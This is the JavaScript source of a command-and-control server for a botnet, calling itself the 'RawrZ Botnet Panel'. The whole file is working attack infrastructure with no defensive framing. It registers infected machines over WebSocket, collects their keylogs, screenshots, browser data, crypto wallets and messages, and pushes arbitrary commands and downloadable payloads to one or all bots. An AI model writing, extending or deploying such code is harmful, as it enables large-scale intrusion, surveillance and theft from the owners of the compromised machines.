const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const PORT = 3000;

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));

// Security headers
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    next();
});

// Bot registry and communication
const botRegistry = new Map();
const activeConnections = new Map();
const commandQueue = new Map();

// WebSocket connection handling
wss.on('connection', (ws, req) => {
    const clientIP = req.connection.remoteAddress || req.socket.remoteAddress;
    const botId = crypto.randomBytes(8).toString('hex');
    
    console.log(`[BOT] New connection from ${clientIP} - Bot ID: ${botId}`);
    
    // Register bot
    botRegistry.set(botId, {
        id: botId,
        ip: clientIP,
        status: 'online',
        lastSeen: new Date(),
        capabilities: [],
        systemInfo: {},
        ws: ws
    });
    
    activeConnections.set(botId, ws);
    
    // Send welcome message
    ws.send(JSON.stringify({
        type: 'welcome',
        botId: botId,
        timestamp: new Date().toISOString()
    }));
    
    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);
            handleBotMessage(botId, message);
        } catch (error) {
            console.error(`[ERROR] Invalid message from bot ${botId}:`, error);
        }
    });
    
    ws.on('close', () => {
        console.log(`[BOT] Bot ${botId} disconnected`);
        if (botRegistry.has(botId)) {
            botRegistry.get(botId).status = 'offline';
        }
        activeConnections.delete(botId);
    });
    
    ws.on('error', (error) => {
        console.error(`[ERROR] WebSocket error for bot ${botId}:`, error);
    });
});

function handleBotMessage(botId, message) {
    const bot = botRegistry.get(botId);
    if (!bot) return;
    
    bot.lastSeen = new Date();
    
    switch (message.type) {
        case 'handshake':
            bot.systemInfo = message.systemInfo || {};
            bot.capabilities = message.capabilities || [];
            console.log(`[BOT] ${botId} handshake - OS: ${bot.systemInfo.os || 'Unknown'}`);
            break;
            
        case 'data_extraction':
            handleDataExtraction(botId, message.data);
            break;
            
        case 'command_result':
            handleCommandResult(botId, message);
            break;
            
        case 'screenshot':
            handleScreenshot(botId, message.data);
            break;
            
        case 'keylog':
            handleKeylog(botId, message.data);
            break;
            
        default:
            console.log(`[BOT] ${botId} unknown message type: ${message.type}`);
    }
}

function handleDataExtraction(botId, data) {
    const bot = botRegistry.get(botId);
    if (!bot) return;
    
    // Store extracted data
    const dataDir = path.join(__dirname, 'extracted_data', botId);
    if (!fs.existsSync(dataDir)) {
        fs.mkdirSync(dataDir, { recursive: true });
    }
    
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `${data.type}_${timestamp}.json`;
    const filepath = path.join(dataDir, filename);
    
    fs.writeFileSync(filepath, JSON.stringify(data, null, 2));
    console.log(`[DATA] Extracted ${data.type} from bot ${botId} - ${data.entries?.length || 0} entries`);
}

function handleCommandResult(botId, message) {
    console.log(`[CMD] Bot ${botId} command result: ${message.result}`);
    // Store command results
    const resultDir = path.join(__dirname, 'command_results', botId);
    if (!fs.existsSync(resultDir)) {
        fs.mkdirSync(resultDir, { recursive: true });
    }
    
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `result_${timestamp}.json`;
    const filepath = path.join(resultDir, filename);
    
    fs.writeFileSync(filepath, JSON.stringify(message, null, 2));
}

function handleScreenshot(botId, data) {
    const bot = botRegistry.get(botId);
    if (!bot) return;
    
    const screenshotDir = path.join(__dirname, 'screenshots', botId);
    if (!fs.existsSync(screenshotDir)) {
        fs.mkdirSync(screenshotDir, { recursive: true });
    }
    
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `screenshot_${timestamp}.png`;
    const filepath = path.join(screenshotDir, filename);
    
    // Save base64 screenshot
    const base64Data = data.replace(/^data:image\/png;base64,/, '');
    fs.writeFileSync(filepath, base64Data, 'base64');
    console.log(`[SCREENSHOT] Saved screenshot from bot ${botId}`);
}

function handleKeylog(botId, data) {
    const bot = botRegistry.get(botId);
    if (!bot) return;
    
    const keylogDir = path.join(__dirname, 'keylogs', botId);
    if (!fs.existsSync(keylogDir)) {
        fs.mkdirSync(keylogDir, { recursive: true });
    }
    
    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
    const filename = `keylog_${timestamp}.txt`;
    const filepath = path.join(keylogDir, filename);
    
    fs.appendFileSync(filepath, `${new Date().toISOString()}: ${data}\n`);
}

// API endpoints for real botnet panel
app.get('/api/botnet/status', (req, res) => {
    const totalBots = botRegistry.size;
    const onlineBots = Array.from(botRegistry.values()).filter(bot => bot.status === 'online').length;
    const offlineBots = totalBots - onlineBots;
    
    // Count actual logs from files
    let totalLogs = 0;
    try {
        const logDirs = ['extracted_data', 'command_results', 'screenshots', 'keylogs'];
        logDirs.forEach(dir => {
            const fullPath = path.join(__dirname, dir);
            if (fs.existsSync(fullPath)) {
                const files = fs.readdirSync(fullPath, { recursive: true });
                totalLogs += files.length;
            }
        });
    } catch (error) {
        console.error('Error counting logs:', error);
    }
    
    res.json({
        success: true,
        data: {
            totalBots: totalBots,
            onlineBots: onlineBots,
            offlineBots: offlineBots,
            totalLogs: totalLogs,
            activeTasks: commandQueue.size,
            serverUptime: process.uptime(),
            lastUpdate: new Date().toISOString()
        }
    });
});

app.get('/api/botnet/bots', (req, res) => {
    const bots = Array.from(botRegistry.values()).map(bot => ({
        id: bot.id,
        ip: bot.ip,
        os: bot.systemInfo.os || 'Unknown',
        status: bot.status,
        lastSeen: bot.lastSeen.toISOString(),
        capabilities: bot.capabilities,
        systemInfo: {
            arch: bot.systemInfo.arch || 'Unknown',
            version: bot.systemInfo.version || 'Unknown',
            hostname: bot.systemInfo.hostname || 'Unknown'
        }
    }));
    
    res.json({
        success: true,
        data: bots
    });
});

app.post('/api/botnet/execute', (req, res) => {
    const { action, target, params } = req.body;
    
    if (!action) {
        return res.status(400).json({
            success: false,
            error: 'Action is required'
        });
    }
    
    const commandId = crypto.randomBytes(8).toString('hex');
    const timestamp = new Date().toISOString();
    
    // Queue command for execution
    commandQueue.set(commandId, {
        id: commandId,
        action: action,
        target: target,
        params: params,
        timestamp: timestamp,
        status: 'queued'
    });
    
    // Send command to target bot(s)
    if (target && target !== 'all') {
        const bot = botRegistry.get(target);
        if (bot && bot.ws && bot.ws.readyState === WebSocket.OPEN) {
            bot.ws.send(JSON.stringify({
                type: 'command',
                commandId: commandId,
                action: action,
                params: params,
                timestamp: timestamp
            }));
            
            commandQueue.get(commandId).status = 'sent';
        } else {
            commandQueue.get(commandId).status = 'failed';
            commandQueue.get(commandId).error = 'Bot not available';
        }
    } else {
        // Send to all online bots
        let sentCount = 0;
        botRegistry.forEach(bot => {
            if (bot.ws && bot.ws.readyState === WebSocket.OPEN) {
                bot.ws.send(JSON.stringify({
                    type: 'command',
                    commandId: commandId,
                    action: action,
                    params: params,
                    timestamp: timestamp
                }));
                sentCount++;
            }
        });
        
        commandQueue.get(commandId).status = sentCount > 0 ? 'sent' : 'failed';
        commandQueue.get(commandId).sentTo = sentCount;
    }
    
    res.json({
        success: true,
        data: {
            commandId: commandId,
            action: action,
            target: target,
            status: commandQueue.get(commandId).status,
            timestamp: timestamp,
            details: params || {}
        }
    });
});

app.get('/api/botnet/logs', (req, res) => {
    const logs = [];
    const limit = parseInt(req.query.limit) || 100;
    const offset = parseInt(req.query.offset) || 0;
    
    try {
        // Read command results
        const resultDir = path.join(__dirname, 'command_results');
        if (fs.existsSync(resultDir)) {
            const botDirs = fs.readdirSync(resultDir);
            botDirs.forEach(botId => {
                const botDir = path.join(resultDir, botId);
                if (fs.statSync(botDir).isDirectory()) {
                    const files = fs.readdirSync(botDir);
                    files.forEach(file => {
                        const filePath = path.join(botDir, file);
                        const stats = fs.statSync(filePath);
                        const content = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                        
                        logs.push({
                            id: logs.length + 1,
                            botId: botId,
                            action: 'command_execution',
                            result: content.result || 'success',
                            timestamp: stats.mtime.toISOString(),
                            details: content.details || `Command executed: ${content.commandId}`,
                            type: 'command'
                        });
                    });
                }
            });
        }
        
        // Read data extraction logs
        const dataDir = path.join(__dirname, 'extracted_data');
        if (fs.existsSync(dataDir)) {
            const botDirs = fs.readdirSync(dataDir);
            botDirs.forEach(botId => {
                const botDir = path.join(dataDir, botId);
                if (fs.statSync(botDir).isDirectory()) {
                    const files = fs.readdirSync(botDir);
                    files.forEach(file => {
                        const filePath = path.join(botDir, file);
                        const stats = fs.statSync(filePath);
                        const content = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                        
                        logs.push({
                            id: logs.length + 1,
                            botId: botId,
                            action: 'data_extraction',
                            result: 'success',
                            timestamp: stats.mtime.toISOString(),
                            details: `Extracted ${content.type}: ${content.entries?.length || 0} entries`,
                            type: 'data'
                        });
                    });
                }
            });
        }
        
        // Sort by timestamp (newest first)
        logs.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        
        // Apply pagination
        const paginatedLogs = logs.slice(offset, offset + limit);
        
        res.json({
            success: true,
            data: paginatedLogs,
            total: logs.length,
            limit: limit,
            offset: offset
        });
        
    } catch (error) {
        console.error('Error reading logs:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to read logs'
        });
    }
});

app.get('/api/botnet/stats', (req, res) => {
    try {
        const stats = {
            browserData: { extracted: 0, browsers: [], lastUpdate: new Date().toISOString() },
            cryptoData: { wallets: 0, totalValue: 0, currencies: [] },
            messagingData: { platforms: [], messages: 0, contacts: 0 },
            systemInfo: { screenshots: 0, keylogs: 0, systemData: 0 }
        };
        
        // Count actual extracted data
        const dataDir = path.join(__dirname, 'extracted_data');
        if (fs.existsSync(dataDir)) {
            const botDirs = fs.readdirSync(dataDir);
            botDirs.forEach(botId => {
                const botDir = path.join(dataDir, botId);
                if (fs.statSync(botDir).isDirectory()) {
                    const files = fs.readdirSync(botDir);
                    files.forEach(file => {
                        try {
                            const content = JSON.parse(fs.readFileSync(path.join(botDir, file), 'utf8'));
                            if (content.type === 'browser') {
                                stats.browserData.extracted += content.entries?.length || 0;
                                if (content.browser && !stats.browserData.browsers.includes(content.browser)) {
                                    stats.browserData.browsers.push(content.browser);
                                }
                            } else if (content.type === 'crypto') {
                                stats.cryptoData.wallets += content.entries?.length || 0;
                                stats.cryptoData.totalValue += content.totalValue || 0;
                                if (content.currency && !stats.cryptoData.currencies.includes(content.currency)) {
                                    stats.cryptoData.currencies.push(content.currency);
                                }
                            } else if (content.type === 'messaging') {
                                stats.messagingData.messages += content.entries?.length || 0;
                                if (content.platform && !stats.messagingData.platforms.includes(content.platform)) {
                                    stats.messagingData.platforms.push(content.platform);
                                }
                            }
                        } catch (error) {
                            console.error('Error reading data file:', error);
                        }
                    });
                }
            });
        }
        
        // Count screenshots
        const screenshotDir = path.join(__dirname, 'screenshots');
        if (fs.existsSync(screenshotDir)) {
            const botDirs = fs.readdirSync(screenshotDir);
            botDirs.forEach(botId => {
                const botDir = path.join(screenshotDir, botId);
                if (fs.statSync(botDir).isDirectory()) {
                    stats.systemInfo.screenshots += fs.readdirSync(botDir).length;
                }
            });
        }
        
        // Count keylogs
        const keylogDir = path.join(__dirname, 'keylogs');
        if (fs.existsSync(keylogDir)) {
            const botDirs = fs.readdirSync(keylogDir);
            botDirs.forEach(botId => {
                const botDir = path.join(keylogDir, botId);
                if (fs.statSync(botDir).isDirectory()) {
                    stats.systemInfo.keylogs += fs.readdirSync(botDir).length;
                }
            });
        }
        
        res.json({
            success: true,
            data: stats
        });
        
    } catch (error) {
        console.error('Error generating stats:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to generate statistics'
        });
    }
});

// File operations endpoints
app.post('/api/botnet/upload-payload', (req, res) => {
    const { filename, content, target } = req.body;
    
    if (!filename || !content) {
        return res.status(400).json({
            success: false,
            error: 'Filename and content are required'
        });
    }
    
    try {
        const payloadDir = path.join(__dirname, 'payloads');
        if (!fs.existsSync(payloadDir)) {
            fs.mkdirSync(payloadDir, { recursive: true });
        }
        
        const filepath = path.join(payloadDir, filename);
        fs.writeFileSync(filepath, content);
        
        // If target specified, send to bot
        if (target && target !== 'all') {
            const bot = botRegistry.get(target);
            if (bot && bot.ws && bot.ws.readyState === WebSocket.OPEN) {
                bot.ws.send(JSON.stringify({
                    type: 'download_payload',
                    filename: filename,
                    url: `http://localhost:${PORT}/api/botnet/download/${filename}`,
                    timestamp: new Date().toISOString()
                }));
            }
        }
        
        res.json({
            success: true,
            data: {
                filename: filename,
                size: content.length,
                uploaded: new Date().toISOString()
            }
        });
        
    } catch (error) {
        console.error('Error uploading payload:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to upload payload'
        });
    }
});

app.get('/api/botnet/download/:filename', (req, res) => {
    const filename = req.params.filename;
    const filepath = path.join(__dirname, 'payloads', filename);
    
    if (!fs.existsSync(filepath)) {
        return res.status(404).json({
            success: false,
            error: 'File not found'
        });
    }
    
    res.download(filepath, filename);
});

app.get('/api/botnet/files/:botId', (req, res) => {
    const botId = req.params.botId;
    const dataDir = path.join(__dirname, 'extracted_data', botId);
    
    if (!fs.existsSync(dataDir)) {
        return res.json({
            success: true,
            data: []
        });
    }
    
    try {
        const files = fs.readdirSync(dataDir).map(file => {
            const filepath = path.join(dataDir, file);
            const stats = fs.statSync(filepath);
            return {
                name: file,
                size: stats.size,
                modified: stats.mtime.toISOString(),
                type: path.extname(file)
            };
        });
        
        res.json({
            success: true,
            data: files
        });
        
    } catch (error) {
        console.error('Error listing files:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to list files'
        });
    }
});

app.get('/api/botnet/download-file/:botId/:filename', (req, res) => {
    const { botId, filename } = req.params;
    const filepath = path.join(__dirname, 'extracted_data', botId, filename);
    
    if (!fs.existsSync(filepath)) {
        return res.status(404).json({
            success: false,
            error: 'File not found'
        });
    }
    
    res.download(filepath, filename);
});

// WebSocket status endpoint
app.get('/api/botnet/websocket-status', (req, res) => {
    res.json({
        success: true,
        data: {
            activeConnections: activeConnections.size,
            totalBots: botRegistry.size,
            onlineBots: Array.from(botRegistry.values()).filter(bot => bot.status === 'online').length,
            queuedCommands: commandQueue.size,
            serverUptime: process.uptime()
        }
    });
});

// Serve the main botnet panel
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'advanced-botnet-panel.html'));
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        version: '1.0.0'
    });
});

// Start the server
server.listen(PORT, () => {
    console.log(` RawrZ Botnet Panel Server running on http://localhost:${PORT}`);
    console.log(` Dashboard: http://localhost:${PORT}/advanced-botnet-panel.html`);
    console.log(` API Status: http://localhost:${PORT}/api/botnet/status`);
    console.log(` Health Check: http://localhost:${PORT}/health`);
    console.log(` WebSocket: ws://localhost:${PORT}`);
    console.log(` Data Directory: ${__dirname}`);
    console.log('\n Real botnet infrastructure ready for connections!');
    console.log(' Bots can connect via WebSocket for real-time communication');
    console.log(' All data is stored in local directories for persistence');
});

module.exports = app;
